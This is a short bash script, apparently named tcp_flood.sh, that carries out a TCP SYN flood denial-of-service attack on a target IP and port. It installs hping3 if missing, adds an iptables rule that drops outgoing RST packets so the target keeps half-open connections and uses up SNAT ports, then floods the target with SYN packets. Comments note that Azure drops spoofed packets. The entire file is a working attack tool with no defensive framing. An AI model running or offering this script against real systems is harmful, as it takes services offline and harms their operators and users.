#!/bin/bash
# Usage: ./tcp_flood.sh <TARGET_IP> <PORT>

TARGET_IP=$1
PORT=${2:-80}

if [ -z "$TARGET_IP" ]; then
  echo "Usage: $0 <TARGET_IP> [PORT]"
  exit 1
fi

# Check if hping3 is installed
if ! command -v hping3 &> /dev/null; then
    echo "hping3 could not be found. Installing..."
    sudo apt-get update
    sudo apt-get install -y hping3
fi

echo "Blocking RST packets to $TARGET_IP to prevent connection teardown..."
# This prevents the OS from sending RST packets in response to SYN-ACKs from the server,
# forcing the server to keep the connection in SYN_RCVD state and consuming SNAT ports.
sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -d $TARGET_IP -j DROP

echo "Starting TCP SYN flood on $TARGET_IP:$PORT..."
# Note: Azure SDN drops spoofed packets, so do not use --rand-source
sudo hping3 -S -p $PORT --flood $TARGET_IP
